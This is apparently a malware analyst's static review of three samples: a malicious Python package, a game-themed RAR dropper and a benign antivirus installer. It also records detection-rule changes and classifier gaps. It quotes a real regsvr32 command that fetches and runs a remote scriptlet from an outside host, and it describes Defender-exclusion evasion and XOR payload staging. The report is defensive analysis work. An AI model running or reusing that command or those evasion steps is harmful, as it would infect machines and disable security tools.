Three-sample static review, 2026-10-25

Verdicts and counts (H=hostile, S=suspicious; parent counts deduplicate members)

nebulallm-1.4.3.tar.gz: MALICIOUS
  Parent H/S 0/1 -> 1/2; setup.py H/S 0/1 -> 1/2.
  nebulallm.py and both PKG-INFO members: 0/0 -> 0/0.
  ML probability 0.9688646 (level 1) -> 0.9993134 (level 0).
  The classifier now flags this package as hostile.

Project Installer.rar: MALICIOUS
  Original RAR H/S 0/0 -> 0/0; ML 0.00034989914 -> 0.00034989914,
  level -1 (benign) both times. The RAR parser cannot extract its encrypted
  v6-method entries, even with the recovered password. This is an analysis gap.
  Original members recovered with RAR 7.23, password 2026; all CRC checks pass.
  ProjectInstaller.exe H/S 2/3 -> 2/3. ML 0.92289627 -> 0.90307873,
  level -1 (benign) both times. This remains a classifier miss independent of
  the archive extraction failure. Other archive members H/S 0/0 -> 0/0.
  No reconstructed archive was substituted for the original RAR.

ad6484135f0edf91.bin: BENIGN (DomainShield/YuDun installer)
  Parent and all embedded members H/S 0/0 -> 0/0.
  ML probability 0.8552085 -> 0.8552085, level -1 (benign) both times.
  Added a notable managed certificate-store API reference; retained dual-use
  file, process, network, registry and crypto observations.

Reverse engineering

1. Python package
  Read all supplied package source and metadata. setup.py registers an install
  subclass through setup(cmdclass={'install': ...}). Its run() invokes Popen
  before install.run(self), with:
    regsvr32.exe -s -i:https://akinomoreno.pythonanywhere.com/faye
      ../scrobj.dll -n -u
  DETACHED_PROCESS and DEVNULL hide/detach its standard streams. Windows-targeted
  execution is unrelated to the advertised asynchronous AI client. The ordinary
  client module uses httpx for sessions and generation; it does not explain the
  install hook. The Windows-only code may fail on other platforms; that does
  not neutralize the unwanted install-time execution attempt.

  Fetched the referenced scriptlet with forager, preserving .forage.json.
  It constructs WinHttp.WinHttpRequest.5.1, GETs /krat.dll, creates nested folders
  below LOCALAPPDATA, writes ResponseBody through ADODB.Stream.SaveToFile, and
  runs rundll32.exe with that exact outputFile and the main export, window 0.
  The write/launch occurs when the destination does not already exist. Its
  Base64 decoder is an unused helper, not part of this response-to-file flow.
  The fetched DLL is a native x64 PE, not a Python dependency. No theft behavior
  or final family attribution was inferred merely from its name or reputation.
  GHSA-mvgr-2gjf-h99c independently describes this scriptlet-to-DLL campaign.

2. Game-themed RAR
  Listed original members and recovered encryption password using a short set
  of common archival passwords. Successfully extracted every original member.
  The batch/JSON/JAR/DLL files present Project Zomboid launch scaffolding; the
  117288391-byte main EXE instead packages Node v22.23.1 and a pkg snapshot.
  The snapshot manifest declares a private dropper-job package, index.js,
  payload.js, ui/shell.js, and four approximately 14 MiB UI asset blobs.

  Recovered snapshot offsets from the final manifest. Payload starts at
  57440768; prelude starts at 117199719. index.js is serialized V8 bytecode,
  not readable source. Extracted the original cached modules without executing
  them. Used the upstream Node v22.23.1 V8 bytecodes.h opcode table to trace:
    main: display program dialog -> administrator probe -> failure dialog/exit
      or saveAndRun.
    administrator probe: execSync('net session') inside try/catch.
    saveAndRun: exclusionWd() -> decryptPayload() -> generate ProgramData
      random EXE path -> fs.writeFileSync(path, decodedBytes) -> spawn(path,
      empty argv, options including hidden/ignored stdio, shell and detach)
      -> child.unref() -> process.exit(0).
    exclusionWd: decode Base64 command, execSync with hidden window/ignored IO.
      Add-MpPreference excludes TEMP, C:\ProgramData and Microsoft/Windows
      subdirectories, followed by gpupdate /force.
    decryptPayload: Buffer.from(encoded, 'base64'), Buffer.alloc(length), loop
      over bytes, XOR against key.charCodeAt(index % key.length), indexed store.
  Relevant index.js cache offsets: main 0x10ed; exclusion 0xb0c; XOR decoder
  0xc80-0xcef; write/launch 0xee0-0xf80. The modulo/XOR/store loop and shared
  pathname registers were verified against actual opcodes, not function names.
  The recovered executable SHA-256 is:
    73c4bf3abc84e6826efb1690ae6c2a255af5465dd369f9323e48283219076e35

  Inspected that native stage with rizin/capstone. Its entry is a heavily
  flattened state machine; string accessors read TLS-backed output buffers.
  Reversed the common string helper: rotate each input byte right by
  index%7+1, then XOR with (13*index+177)&255. Both byte and UTF-16 source
  variants occur. This recovers a ProgramData RuntimeBroker executable path,
  an external host/ports, WebSocket upgrade, ready/ping/pong/getinfo/task
  protocol tokens, VM driver/adapter probes, security-product WMI queries,
  AMSI/OpenSession references, scheduled-task folders/triggers and native
  allocation/write/thread API names. These are not claimed as plaintext
  findings on the original archive. The separately recovered stage fires
  existing hostile remote-memory-loader and CMSTPLUA-elevation rules, but
  those rules do not automatically reach through the outer V8/XOR layers.
  The explicit Defender evasion and decoded-file execution, deceptive game
  packaging and encrypted embedded stage tip the original verdict malicious.

3. DomainShield / YuDun
  Decompiled the outer YuDunSetup installer and embedded YuDun executable with
  ILSpy. The outer program unpacks named resources under LocalAppData,
  creates desktop/start-menu shortcuts and starts YuDun.exe visibly. It carries
  Microsoft WebView2 Core/WinForms/Loader plus local HTML/CSS/JavaScript and a
  signature database; no AsyncRAT assembly or configuration was recovered.
  The inner program asks the user to run, shows a scanner/tray UI, scans selected
  and preset directories, hashes/classifies files, offers quarantine/restore/
  secure deletion, monitors files and Run-key changes for its behavior guard,
  and offers netstat/firewall controls. Its command bridge accepts messages
  only from the app.yudun.local virtual origin and rejects other navigation.
  The malware strings are signature rules and user-triggered GenSample output;
  its ransomware test writes an HTA text file rather than encrypting files.
  No remote command-to-process task channel was found. Cloud lookup sends the
  selected file's hash to VirusTotal with a user-configured key, not file bytes.

  Followed the referenced signature update manifest and DB using forager.
  Retrieved DB hash equals the manifest's
    7490ebe4312fd0834c40f91fce27175d4b8f0ed06dd299b6f5fc45676ff336d9
  The update path checks size, SHA-256 and version before saving JSON; it does
  not load downloaded code. Reviewed activation email, breach lookup and local
  server code. SMTP configuration comes from local config/environment and mail
  targets the user-supplied email. The localhost TLS server and root-store-add
  routine are defined, but no caller of StartActivateServer was found in this
  build. The new trait consequently reports only a managed API reference.

  Outer and inner executables are unsigned. WebView2 dependency signatures
  have matching Authenticode content digests, but local chain verification
  cannot obtain the issuer. Independently fetched Microsoft.Web.WebView2
  1.0.4129.50 from NuGet: all THREE bundled DLLs match upstream byte-for-byte
  (see webview-comparison.json). This is stronger integrity evidence than
  publisher/version strings. The application itself has no authenticated
  upstream identity; distribution/installation consent and the source's exact
  sandbox reasoning remain unavailable. BENIGN here is a balance-of-evidence
  judgment, not a general allowlist. Embedded AsyncRAT signatures, test threat
  commands, registry watching and quarantine/network operations plausibly explain
  malware collection or a family false label. Reputation alone was not cleared
  or treated as proof of either verdict.

Trait changes and preservation

  Accepted both /i: and -i: HTTP switch spellings, including encoded and hex
  forms. Prior slash-form matches remain intact. Moved the install-hook
  regsvr32 composite from legacy supply-chain context to the execution LOLBin
  home. The trigger remains required packaging evidence.

  Moved scrobj name/encoded/hex observations from DLL loading to library-path
  references. A string does not establish LoadLibrary. Names/descriptions now
  say reference. Exact consumers and ancestor-selector suppressions retain the
  same observation sets; a named exception group avoids increasing the written
  suppression list. All previous matchers, exclusions, severities and scopes
  are retained.

  Moved the pkg hidden-Defender-exclusion profile from C2/staging to anti-AV.
  Moved the large/hidden-PowerShell profile to process/window configuration;
  it establishes neither a staging path nor padding. Moved the large pkg
  high-entropy overlay profile to binary layout: that structural evidence alone
  establishes neither packing nor padding intent. Preserved all criticalities.

  Moved the createDecipheriv reference to neutral crypto/decrypt and updated
  its consumers. Its text also exists in ordinary bundled Node runtime code.
  Renamed the existing Defender/cipher-reference composite so it no longer
  claims application decryption or an execution order unsupported by its
  matcher. Both pre-existing hostile detections remain, without inventing AES
  use for this XOR loader.

  Added conservative V8 header, modulo/XOR/store bytecode, paired-call-register
  and overlay-name observations, plus the managed certificate-store API name.
  A candidate hostile V8 write-and-spawn chain was investigated but not kept:
  generic named-string co-occurrence cannot identify arbitrary serialized
  constant-pool callees. Current facts do not expose those bindings. Its useful
  static observations are retained as notable findings instead of overstating
  data flow. Large-leaf admission checks also prevented placing additional
  rules into already-full leaves; no budgets were raised, no catalogs were
  arbitrarily split, and no old detections were removed to make room.

  comparisons.json confirms no unmapped original/member detection losses.
  Existing attacks are retained through explicit old-to-new ID mappings.
  Controls verify slash and dash scriptlet commands, normal local registration,
  URL-only input, a V8 XOR sequence, an OR near miss and missing-cache context.
  Real main-EXE matching verified the bytecode observations independently.

Remaining coverage / classifier gaps

  nebulallm has ONE hostile finding in the original archive. The only clear
  hostile result present there is install-time remote scriptlet execution;
  subsequent DLL staging/launch is in fetched bytes, not shipped source.
  A three-hostile quota would require duplicate or unsupported claims.

  ProjectInstaller.exe retains TWO hostile anti-AV profiles and gains notable
  decoding/bytecode observations. The manually decoded native implant's C2,
  persistence, VM probes and injection are not fully detected through the V8
  code-cache/XOR wrapper. The attempted callee-based rule lacks a structural
  constant-pool binding matcher, so it was not promoted to a hostile claim.
  The RAR decoder also cannot extract this v6 encrypted archive. The unchanged
  archive ML-benign verdict and the still-ML-benign extracted installer must
  both be treated as misses. A malicious marker does not close these gaps.

  DomainShield remains 0 hostile / 0 suspicious. Accurate dual-use observations
  remain. Embedded signature/test strings explain references to hostile
  techniques without establishing their execution or an AsyncRAT deployment.

Evidence locations

  Original scans, full cleave facts, decompiled code, extracted V8 modules,
  native disassembly/decoded strings, downloaded stages and .forage.json files:
    /usr/local/var/cyclotron/tmp.noindex/cyclotron-e78afdd4/scratch/review/
  Original before/after scans used --no-update --analyze local --mode slow
  --follow=none; recovered RAR members were scanned separately. The original
  RAR was also re-scanned with --zip-password 2026. Final main-EXE scan followed
  the final strengthened XOR matcher. No malware code was executed on the host.

Marker lines (verbatim commit-body text)
  nebulallm 1.4.3: install hook runs remote scriptlet; fix -i switch
  Project Installer: Defender exclusions precede XOR payload execution
  DomainShield/YuDun: local AV scanner; upstream WebView2 bytes match
